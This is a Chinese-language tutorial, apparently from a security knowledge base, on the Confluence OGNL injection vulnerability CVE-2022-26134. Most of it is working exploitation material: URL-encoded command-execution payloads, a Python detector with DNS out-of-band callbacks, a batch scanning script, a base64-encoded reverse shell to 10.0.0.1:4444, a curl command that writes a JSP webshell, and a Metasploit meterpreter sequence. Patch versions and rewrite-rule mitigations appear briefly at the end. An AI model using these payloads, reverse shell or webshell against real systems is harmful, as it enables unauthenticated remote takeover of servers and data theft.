# Confluence OGNL 注入漏洞完整分析 (CVE-2022-26134)

> 📅 2026-06-12 | 🎯 精通 | ⏱ 20 min | 分类：漏洞库与EXP

## 📋 提纲

1. 漏洞概述
2. Atlassian Confluence 架构与 OGNL
3. 漏洞原理深度分析
4. 漏洞检测
5. 完整利用复现
6. 漏洞修复
7. 护网中的 Confluence

---

## 1. 漏洞概述

**CVE-2022-26134**
- CVSS: 9.8（最高危）
- 类型：OGNL 表达式注入 → RCE
- 影响：Confluence Server / Data Center 1.3.0 ~ 7.18.0
- 前提：无需认证
- 公开：2022年6月2日

### 1.1 历史高危

Confluence 历年来多次出现预认证 RCE：
- CVE-2019-3396: Widget Connector SSTI → RCE
- CVE-2021-26084: OGNL 注入
- CVE-2022-26134: OGNL 注入（本次）
- CVE-2023-22515: 权限提升 + 管理员创建

---

## 2. OGNL 表达式引擎

### 2.1 什么是 OGNL

```
OGNL（Object-Graph Navigation Language）= Java 的对象图导航语言
类似：EL 表达式、SpEL、JEXL

OGNL 表达式示例：
${1+1}                         → 数学计算
${#session.user.name}          → 访问Session属性  
${@java.lang.Runtime@getRuntime().exec('id')} → 命令执行！
```

### 2.2 为什么危险

OGNL 设计为可以访问任意Java对象和方法，包括 `Runtime.getRuntime().exec()`。

Confluence 使用 OGNL 作为模板引擎来处理部分URL。

---

## 3. 漏洞原理

### 3.1 漏洞触发点

```
URL Path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/

URL解码：
/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/

Confluence 在处理包含 OGNL 表达式的 URL 时：
1. URL解码 ${...}
2. OGNL 引擎解析并执行表达式
3. 表达式调用 Runtime.exec() → RCE
4. 结果通过HTTP响应头返回
```

### 3.2 漏洞代码路径

```
请求进入 → ServletDispatcher → ActionMapping →
匹配不到Action → 返回404页面 →
但！在处理请求过程中，Confluence对URL中的 %2F 做了特殊处理 →
使用OGNL解析URL中的值 → OGNL表达式被执行
```

---

## 4. 漏洞检测

```python
#!/usr/bin/env python3
"""CVE-2022-26134 检测"""

import requests
import urllib.parse
import urllib3
urllib3.disable_warnings()

def detect_cve_2022_26134(target):
    target = target.rstrip('/')

    # 方法1: DNS外带检测（最安全）
    interact_domain = "xxx.oastify.com"
    ognl_payload = f'${{@java.lang.Runtime@getRuntime().exec("nslookup $(whoami).{interact_domain}")}}'
    encoded = urllib.parse.quote(ognl_payload, safe='')

    try:
        resp = requests.get(
            f"{target}/{encoded}/",
            verify=False,
            timeout=15
        )
        print(f"[DNS外带] 状态: {resp.status_code} - 检查Burp Collaborator/Interactsh")
    except:
        pass

    # 方法2: 命令执行回显检测
    cmd = "id"
    ognl_payload = (
        '${'
        '(#a=@org.apache.commons.io.IOUtils@toString('
        '@java.lang.Runtime@getRuntime().exec("' + cmd + '").getInputStream(),"utf-8"))'
        '.(@com.opensymphony.webwork.ServletActionContext@getResponse()'
        '.setHeader("X-Cmd-Response",#a))'
        '}'
    )
    encoded = urllib.parse.quote(ognl_payload, safe='')

    try:
        resp = requests.get(
            f"{target}/{encoded}/",
            verify=False,
            timeout=15,
            allow_redirects=False
        )

        cmd_result = resp.headers.get('X-Cmd-Response', '')
        if cmd_result:
            return {
                "vulnerable": True,
                "method": "命令回显",
                "cmd": cmd,
                "result": cmd_result[:200]
            }

        # 即使没有回显，如果状态不是404也值得怀疑
        if resp.status_code in [200, 302]:
            return {
                "vulnerable": True,
                "method": "状态码异常",
                "status_code": resp.status_code
            }
    except:
        pass

    return {"vulnerable": False}
```

### 4.2 批量检测

```bash
#!/bin/bash
# 批量Confluence检测
while IFS= read -r url; do
    echo "检测: $url"

    # 发送无害的echo探测
    resp=$(curl -sk -o /dev/null -w "%{http_code}" \
        "$url/\$%7B%22test%22%7D/" 2>/dev/null)

    if [ "$resp" == "302" ] || [ "$resp" == "200" ]; then
        # 进一步验证
        cmd_resp=$(curl -sk -D - "$url/\$%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20vulnerable%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/" 2>/dev/null)

        if echo "$cmd_resp" | grep -q "vulnerable"; then
            echo "  🔴 漏洞确认: $url"
            echo "$url" >> confluence_vuln.txt
        fi
    fi
done < targets.txt
```

---

## 5. 完整利用

### 5.1 无回显 → 回显

```bash
# 如果默认payload没有回显，换用这个（通过Header返回）
curl -sk "https://target.com/\$%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -D - | grep X-Cmd-Response
```

### 5.2 反弹Shell

```bash
# 反弹Shell Payload
# bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'

PAYLOAD='bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'

curl -sk "https://target.com/\$%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28new%20String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22$PAYLOAD%22%7D%29%7D/"
```

### 5.3 写入WebShell

```bash
# 找到Confluence安装目录，写入JSP Webshell
WEB_ROOT="/opt/atlassian/confluence/confluence"

# 通过OGNL写入
curl -sk "https://target.com/\$%7Bnew%20java.io.FileOutputStream%28%22${WEB_ROOT}/shell.jsp%22%29.write%28new%20String%28%22%3C%25%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%5C%22cmd%5C%22%29%29%3B%20%25%3E%22%29.getBytes%28%29%29%7D/"
```

### 5.4 Metasploit

```bash
msf6 > use exploit/multi/http/atlassian_confluence_ognl_injection
msf6 > set RHOSTS 192.168.1.100
msf6 > set TARGETURI /
msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.1
msf6 > run
```

---

## 6. 修复方案

### 6.1 升级版本

```
受影响的Confluence版本：1.3.0 ~ 7.18.0

安全版本：
- 7.4.17
- 7.13.7
- 7.14.3
- 7.15.2
- 7.16.4
- 7.17.4
- 7.18.1
```

### 6.2 临时缓解

```bash
# 方法1: 添加 rewrite 规则阻断
# Apache/Nginx 添加：
RewriteRule ^/.*\$%7B.*%7D/ /blocked [R=403,L]

# 方法2: 关闭Confluence（如果不能立即打补丁）
systemctl stop confluence

# 方法3: IP白名单限制访问
iptables -A INPUT -p tcp --dport 8090 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 8090 -j DROP
```

---

## ✅ Confluence Checklist

- [ ] 全网Confluence版本扫描
- [ ] OGNL注入检测
- [ ] 升级到安全版本
- [ ] WAF/反向代理规则阻断
- [ ] 入侵排查（日志分析）
- [ ] 护网前确认修复

> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/009-Spring4Shell | CTF/009-JNDI
